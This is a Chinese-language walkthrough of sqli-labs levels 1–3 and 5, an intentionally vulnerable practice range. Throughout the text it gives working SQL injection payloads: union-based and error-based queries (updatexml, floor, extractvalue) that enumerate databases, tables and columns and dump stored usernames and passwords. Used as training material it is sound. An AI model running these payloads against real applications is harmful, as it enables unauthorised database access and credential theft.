Sqlilabs靶场1-5

知识点

查数据库名：select database()
information_schema.tables：存储mysql数据库下面的所有表名信息的表
table_schema：数据库名
table_name：表名
column_name：列名
information_schema.columns ：存储mysql数据库下面的所有列名信息的表
table_name：表名
–+：表示注释，目的是把字符数据的后一个单引号及后面的语句注释掉，以免影响
group_concat函数：它将相同行的指定列的数据连在一起，如果不用该函数，只能显示一个数据，满足不了我们的需求，所以用group_concat函数将所有数据显示

Less-1

界面：

测试：

1、 url + ?id=1

回显正常，说明不是数字型注入
2、 url + ?id=1’

回显报错，说明是字符型注入
3、 url + ?id=1’ or ‘1’=’1

回显正常，单引号闭合成功，通过单引号闭合进行注入
4、进行测试：

  • url + ?id=1' order by 3--+
    //回显正常
  • url + ?id=1' order by 4--+
    //报错："Unknown column '4' in 'order clause'"


通过逐个测试，得出字段数为3，进行联合注入
5、查看回显的字段：
url + ?id=-1’ union select 1,2,3 –+
//得到可以回显的字段：2,3字段

url + ?id=-1’ union select 1,database(),3 –+
//得到字段2所对应的数据库名为security

6、查看所有数据库名：
url + ?id=-1’ union select 1,
(select group_concat(schema_name) from information_schema.schemata),3 –+

7、查看security库内的所有表名：
url + ?id=-1’ union select 1,
(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+

8、爆出users表中的列名：
url + ?id=-1’ union select 1,
(select group_concat(column_name) from information_schema.columns where table_name=’users’),3 –+

有用户名和密码
9、爆破用户名和密码：
url + ?id=-1’ union select 1,
(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+

得到所有的用户名和密码

Less-2

界面：


进行测试，结果如下：

发现属于数字型注入，不需要进行闭合，直接进行注入
同Less-1一样，通过构造?id=-1 order by 1/2/3/4来得出字段数为3
构造?id=1 and 1=2 union select 1,2,3 或者 ?id=-1 union select 1,2,3来判断回显字段：

回显字段和Less-1一样是2和3
//其他步骤同Less-1类似，只是id=-1后没有加’

最终payload：

?id=-1 union select 1,
(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+

得到所有用户名和密码

Less-3

界面

测试：

单引号与括号闭合

  • url + ?id=1 //回显正常
  • url + ?id=1' //You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
  • url + ?id=1') --+ //回显正常

构造?id=1’) order by 1/2/3/4–+ 获得字段数3

构造：?id=-1) union select 1,2,3–+

回显字段依然是2和3
其余步骤依然与Less-1类似，只需将id=1’改成id=-1’)

最终payload：

?id=-1’) union select 1,
(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+

得到所有用户名和密码！

Less-5

界面：

测试：

###1、逐个测试

  • ?id=1 //回显：You are in..........
  • ?id=1' //回显：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

构造：?id=1’ order by 3–+ 来确认字段数量
###2、获取数据库名
法一：通过updatexml报错注入：

  • ?id=1' and 1=(updatexml(1,concat(0x3a,(select database())),1))%23
法二：通过floor报错注入：
  • ?id=1' union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+

可以知道数据库名为：security

###3、获取security数据库的表名

  • ?id=1' and updatexml('~',concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),'~')--+


###4、查询users表内的字段名

  • ?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,32)))--+

###5、查询users表内的字段数据

  • ?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),1,32)))--+
